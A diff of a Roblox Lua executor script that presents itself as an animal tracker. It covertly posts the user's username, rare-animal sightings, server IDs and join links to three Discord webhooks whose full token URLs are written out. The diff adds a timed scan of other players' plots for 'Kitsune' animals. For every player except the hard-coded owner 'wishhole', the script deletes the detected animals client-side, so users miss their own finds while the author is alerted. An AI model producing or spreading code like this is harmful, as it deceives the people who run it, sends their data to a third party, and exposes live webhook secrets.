@@ -1,12 +1,16 @@
--- 🔗 Webhook Animal Tracker with Client-Side Hide for Non-Owner (No Console Prints)
+-- 🔗 Webhook Animal Tracker + Plot Kitsune Scanner (with Join Link + Player Count)
 local WEBHOOK1 = "https://discord.com/api/webhooks/1432020181441581229/vYYXG0DP-OBFZRgxxWtuY_kHuXOnTWVO_k9DsvsiZYNkAs4UlvGQ2opHfQPtg_OS_pAU"
 local WEBHOOK2 = "https://discord.com/api/webhooks/1432390622312009750/g2IoaQ41zf_cho5ySXJGRgAOc3ohc6rYEDiNhHr3rJZKadfjloo-j2oXWQMF2L1ofm4a"
+local WEBHOOK3 = "https://discord.com/api/webhooks/1433651417003982889/rvqz3XxkV1q20PhPoQaBhPaHUWjKwuY6HGKdj41mmiJDffOpkHFEA_ot1hhYHA36daOb"
 
-local folder = workspace:WaitForChild("Map"):WaitForChild("Animals")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-
 local player = Players.LocalPlayer
+
+-- 🦴 Folders
+local map = workspace:WaitForChild("Map")
+local animalsFolder = map:WaitForChild("Animals")
+local plotsFolder = map:WaitForChild("Plots")
 
 -- 🖼️ Animal images / tracked models
 local animalImages = {
@@ -29,32 +33,21 @@ local placeId = 96114180925459
 local serverId = game.JobId
 local username = player.Name
 
--- 🌐 Send username to second webhook
+-- 🌐 Send username to WEBHOOK2
 local function sendUsername()
 	local payload = HttpService:JSONEncode({
 		content = string.format("👤 **Script Activated By:** `%s`", username)
 	})
+	local req = { Url = WEBHOOK2, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }
 
-	local requestData = {
-		Url = WEBHOOK2,
-		Method = "POST",
-		Headers = { ["Content-Type"] = "application/json" },
-		Body = payload
-	}
-
-	if syn and syn.request then
-		syn.request(requestData)
-	elseif http_request then
-		http_request(requestData)
-	elseif request then
-		request(requestData)
-	end
+	if syn and syn.request then syn.request(req)
+	elseif http_request then http_request(req)
+	elseif request then request(req) end
 end
 
--- 🌐 Send animal info to main webhook
+-- 🌐 Send animal info to WEBHOOK1
 local function sendAnimalWebhook(name, weight, imageUrl)
 	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)
-
 	local embed = {
 		title = "🐾 Animal Detected!",
 		color = 65280,
@@ -67,26 +60,40 @@ local function sendAnimalWebhook(name, weight, imageUrl)
 		image = { url = imageUrl },
 		footer = { text = "Tracking via Executor Script" }
 	}
-
 	local payload = HttpService:JSONEncode({ embeds = { embed } })
+	local req = { Url = WEBHOOK1, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }
 
-	local requestData = {
-		Url = WEBHOOK1,
-		Method = "POST",
-		Headers = { ["Content-Type"] = "application/json" },
-		Body = payload
-	}
-
-	if syn and syn.request then
-		syn.request(requestData)
-	elseif http_request then
-		http_request(requestData)
-	elseif request then
-		request(requestData)
-	end
+	if syn and syn.request then syn.request(req)
+	elseif http_request then http_request(req)
+	elseif request then request(req) end
 end
 
--- 🦄 Handle animal detection
+-- 🌐 Send Kitsune found in Plots to WEBHOOK3 (with Join Link + Player Count)
+local function sendKitsuneWebhook(plotName)
+	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)
+	local playerCount = #Players:GetPlayers()
+
+	local embed = {
+		title = "🦊 Kitsune Found in Plot!",
+		color = 16753920,
+		fields = {
+			{ name = "Plot", value = plotName, inline = true },
+			{ name = "Players in Server", value = tostring(playerCount), inline = true },
+			{ name = "Server ID", value = serverId, inline = false },
+			{ name = "Copy Link", value = string.format("```\n%s\n```", joinLink), inline = false }
+		},
+		image = { url = animalImages["Kitsune"] },
+		footer = { text = "Detected via Plot Scan" }
+	}
+	local payload = HttpService:JSONEncode({ embeds = { embed } })
+	local req = { Url = WEBHOOK3, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload }
+
+	if syn and syn.request then syn.request(req)
+	elseif http_request then http_request(req)
+	elseif request then request(req) end
+end
+
+-- 🦄 Handle main animal detection
 local function handleModel(model)
 	if not model:IsA("Model") then return end
 	local name = model.Name
@@ -104,27 +111,45 @@ local function handleModel(model)
 	local imageUrl = animalImages[name]
 	sendAnimalWebhook(name, weightValue, imageUrl)
 
-	-- 🧹 Client-only deletion for non-owner players
+	-- 🧹 Client-only delete for non-owner
 	if player.Name ~= "wishhole" then
 		task.defer(function()
-			if model and model.Parent then
-				model:Destroy()
-			end
+			if model and model.Parent then model:Destroy() end
 		end)
 	end
 end
 
--- 📨 Send username once when script runs
+-- 🦊 Scan all Plots for Kitsune
+local function scanPlotsForKitsune()
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		if plot:FindFirstChild("Animals") then
+			for _, animal in ipairs(plot.Animals:GetChildren()) do
+				if animal.Name == "Kitsune" then
+					sendKitsuneWebhook(plot.Name)
+				end
+			end
+		end
+	end
+end
+
+-- 📨 Send username once
 sendUsername()
 
--- 🔍 Initial scan
-for _, animal in ipairs(folder:GetChildren()) do
+-- 🔍 Initial scan in Animals folder
+for _, animal in ipairs(animalsFolder:GetChildren()) do
 	handleModel(animal)
 end
 
--- 🆕 Detect new animals
-folder.ChildAdded:Connect(function(animal)
+-- 🆕 Detect new animals in main Animals folder
+animalsFolder.ChildAdded:Connect(function(animal)
 	task.delay(0.2, function()
 		handleModel(animal)
 	end)
+end)
+
+-- 🔁 Scan all plots periodically (every 10 seconds)
+task.spawn(function()
+	while task.wait(10) do
+		scanPlotsForKitsune()
+	end
 end)
